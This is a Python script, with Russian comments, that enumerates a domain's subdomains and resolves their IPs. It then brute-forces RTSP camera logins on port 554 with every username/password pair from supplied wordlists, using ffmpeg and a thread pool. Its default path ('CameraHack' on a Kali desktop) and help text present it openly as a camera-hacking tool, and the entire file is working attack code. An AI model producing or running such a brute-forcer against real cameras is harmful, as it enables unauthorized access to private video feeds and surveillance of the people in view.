import argparse
import subprocess
import os
import imageio_ffmpeg as ffmpeg
import logging
import time
import atexit
from concurrent.futures import ThreadPoolExecutor, as_completed

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[
    logging.FileHandler('scan.log'),
    logging.StreamHandler()
])

def check_command_exists(command):
    """Проверяет наличие утилиты в PATH."""
    return subprocess.call(f"type {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def find_subdomains(domain, sublist3r_path):
    """Ищет поддомены для указанного домена с помощью Sublist3r."""
    if not os.path.isfile(sublist3r_path):
        logging.error('Утилита `sublist3r` не найдена. Убедитесь, что путь указан верно.')
        return []

    try:
        logging.info(f'Поиск поддоменов для {domain}')
        result = subprocess.run([sublist3r_path, '-d', domain, '-o', 'subdomains.txt'], capture_output=True, text=True)
        if result.returncode == 0:
            with open('subdomains.txt', 'r') as file:
                subdomains = file.read().splitlines()
            return subdomains
        else:
            logging.error(f'Не удалось выполнить поиск поддоменов: {result.stderr}')
            return []
    except Exception as e:
        logging.error(f'Ошибка при поиске поддоменов: {str(e)}')
        return []

def check_rtsp_stream(url):
    """Проверяет доступность RTSP потока по указанному URL."""
    try:
        ffmpeg_executable = ffmpeg.get_ffmpeg_exe()
        if not ffmpeg_executable:
            logging.error('Утилита ffmpeg не найдена. Установите её и добавьте в PATH.')
            return

        command = [
            ffmpeg_executable,
            '-rtsp_transport', 'tcp',
            '-i', url,
            '-t', '10',
            '-f', 'null',
            '-'
        ]
        result = subprocess.run(command, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            logging.info(f'RTSP поток доступен: {url}')
        else:
            error_message = result.stderr.strip()
            if "Connection refused" in error_message:
                logging.error(f'Не удалось подключиться к RTSP потоку: {url}')
            else:
                logging.error(f'Ошибка при подключении к RTSP потоку {url}: {error_message}')
    except subprocess.TimeoutExpired:
        logging.error(f'Таймаут при подключении к RTSP потоку: {url}')
    except Exception as e:
        logging.error(f'Ошибка при проверке RTSP потока: {str(e)}')

def brute_force_rtsp(username, password, ip):
    """Пытается подключиться к RTSP потоку с использованием логина и пароля."""
    rtsp_url = f'rtsp://{username}:{password}@{ip}:554/'
    logging.info(f'Попытка подключения с логином "{username}" и паролем "{password}" к {ip}')
    check_rtsp_stream(rtsp_url)
    time.sleep(1)  # Задержка в 1 секунду

def scan_domain(domain, user_file, pass_file, sublist3r_path, max_workers=10, timeout=30):
    """Сканирует домен и поддомены для проверки RTSP потоков."""
    subdomains = find_subdomains(domain, sublist3r_path)
    if not subdomains:
        subdomains = [domain]
    
    if not check_command_exists('dig'):
        logging.error('Утилита dig не найдена. Установите её и добавьте в PATH.')
        return

    try:
        with open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
            users = uf.read().splitlines()
            passwords = pf.read().splitlines()
    except FileNotFoundError as e:
        logging.error(f'Не удалось открыть файл: {str(e)}')
        return
    except Exception as e:
        logging.error(f'Ошибка при чтении файлов: {str(e)}')
        return

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for subdomain in subdomains:
            logging.info(f'Сканирование поддомена: {subdomain}')
            try:
                ip = subprocess.check_output(['dig', '+short', subdomain], text=True).strip()
                if not ip:
                    logging.warning(f'Не удалось получить IP для {subdomain}')
                    continue
                
                logging.info(f'Найден IP: {ip}')

                for user in users:
                    for password in passwords:
                        futures.append(executor.submit(brute_force_rtsp, user, password, ip))
                
            except subprocess.CalledProcessError:
                logging.error(f'Не удалось разрешить IP для {subdomain}')
        
        # Ожидание завершения всех задач
        for future in as_completed(futures):
            try:
                future.result()  # Получаем результат, чтобы обрабатывать исключения, если они возникли
            except Exception as e:
                logging.error(f'Ошибка при выполнении задачи: {str(e)}')

def clean_up():
    """Очистка временных файлов и завершение процессов."""
    if os.path.exists('subdomains.txt'):
        os.remove('subdomains.txt')

atexit.register(clean_up)

def main():
    parser = argparse.ArgumentParser(description='Сканирование доменов для камер RTSP')
    parser.add_argument('domain', type=str, help='Домен для сканирования')
    parser.add_argument('user_file', type=str, help='Файл с логинами для брутфорса')
    parser.add_argument('pass_file', type=str, help='Файл с паролями для брутфорса')
    parser.add_argument('--sublist3r_path', type=str, default='/home/kali/Desktop/APT/ScriptsVsCodium/CameraHack/Sublist3r/sublist3r', help='Путь к утилите Sublist3r')
    parser.add_argument('--max_workers', type=int, default=10, help='Максимальное количество потоков')
    parser.add_argument('--timeout', type=int, default=30, help='Время ожидания подключения в секундах')
    args = parser.parse_args()

    logging.info(f'Сканирование домена {args.domain}')
    scan_domain(args.domain, args.user_file, args.pass_file, args.sublist3r_path, args.max_workers, args.timeout)

if __name__ == "__main__":
    main()
